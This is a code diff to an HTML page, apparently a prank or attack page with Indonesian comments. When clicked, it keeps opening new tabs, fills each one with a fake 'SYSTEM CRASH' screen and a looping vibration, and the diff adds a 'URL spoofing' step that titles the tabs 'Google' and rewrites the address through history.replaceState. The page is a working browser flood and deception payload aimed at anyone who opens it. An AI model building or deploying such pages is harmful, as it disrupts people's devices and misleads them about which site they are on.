@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>One-Click Race Condition</title>
+<title>One-Click Race Condition + URL Spoofing</title>
 <style>
 * { box-sizing: border-box; margin: 0; padding: 0; }
 body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0a; color: #fff; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
@@ -57,7 +57,7 @@ startBtn.addEventListener("click", function() {
     efekHacker();
 
     let dipicu = 0;
-    statusDiv.textContent = "Memicu One-Click Race Condition...";
+    statusDiv.textContent = "Memicu One-Click Race Condition + Spoofing...";
 
     // RACE CONDITION: Looping Tanpa Henti
     function picuTerusMenerus() {
@@ -69,11 +69,11 @@ startBtn.addEventListener("click", function() {
             // SUNTIKKAN KODE KE TAB BARU
             if (w) {
                 try {
-                    // Tulis HTML ke tab baru beserta script untuk terus membuka tab baru
+                    // Tulis HTML ke tab baru
                     w.document.write(`
                         <!DOCTYPE html>
                         <html>
-                        <head><title>SYSTEM ERROR</title></head>
+                        <head><title>Google</title></head>
                         <body style="margin:0;padding:0;background:#000;color:#f00;display:flex;align-items:center;justify-content:center;height:100vh;font-family:monospace;text-align:center;">
                             <div>
                                 <h1 style="font-size:60px; text-shadow:0 0 20px #f00;">SYSTEM CRASH</h1>
@@ -81,6 +81,12 @@ startBtn.addEventListener("click", function() {
                                 <p id="status" style="color:#ff0; font-size:12px; margin-top:20px;">Memicu Race Condition...</p>
                             </div>
                             <script>
+                                // --- URL SPOOFING ---
+                                // Mencoba mengganti URL menjadi google.com
+                                try {
+                                    window.history.replaceState({}, '', 'https://google.com');
+                                } catch(e) {}
+
                                 // Getar Sangat Lama (Looping di dalam tab baru)
                                 if (navigator.vibrate) {
                                     setInterval(function() {
